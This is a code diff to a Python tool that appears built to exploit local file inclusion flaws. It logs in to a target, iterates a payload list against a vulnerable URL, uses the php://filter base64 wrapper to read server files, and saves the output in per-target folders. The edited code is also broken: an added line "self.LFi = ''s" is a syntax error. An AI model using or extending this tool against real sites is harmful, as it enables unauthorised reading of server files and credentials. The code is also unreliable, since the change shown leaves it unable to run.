@@ -88,7 +88,7 @@ class Read_File:
                request.set_handle_refresh(True, max_time=1)
                request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('username',f'{self.args.user}'),
-                                 ('password',f'{self.args.password}')
+                                 ('password',f'{self.args.password}'),
                                  ('Cookie',str(self.Cookie).replace('\n',''))]
                try:                  
                   url_login = request.open(loginurl)
@@ -139,26 +139,25 @@ class Read_File:
                self.url   = response.geturl()   
                   
      def url_request(self,**kwargs):  
-        try: 
-           if self.args.Domain:
-               domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Domain)).split()
-               self.ip_re = (domain[-1][7:-2])
-               self.ip_re = self.ip_re[6:]
-
-           else:
-               self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
-                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl) 
+        try:
+            try: 
+              domain = str(re.search(r'https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
+              self.ip_re = (domain[-1][7:-2])
+              self.ip_re = self.ip_re[6:]
+            except Exception :
+               self.ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',self.args.Vulnurl)
                self.ip_re = self.ip_re.group()
-           if not os.path.exists('./FileStore/'+self.ip_re+"/"):
+               print(self.ip_re)
+            if not os.path.exists('./FileStore/'+self.ip_re+"/"):
                   os.makedirs('./FileStore/'+self.ip_re+"/") 
-           if self.args.auth:
+            if self.args.auth:
                self.Login_auth()  
-                        
-           with open('./Package/LFT_one.txt','r') as readline :
+                         
+            with open('./Package/LFT_one.txt','r') as readline :
                 command_dir = readline.readlines()
                 for LINE in command_dir :
                     LINE.replace('\n','')
-                    self.LFi = ''
+                    self.LFi = ''s
                     if self.args.base64:
                         phpfillter = 'php://filter/read=convert.base64-encode/resource='
                         URL = self.args.Vulnurl+ phpfillter
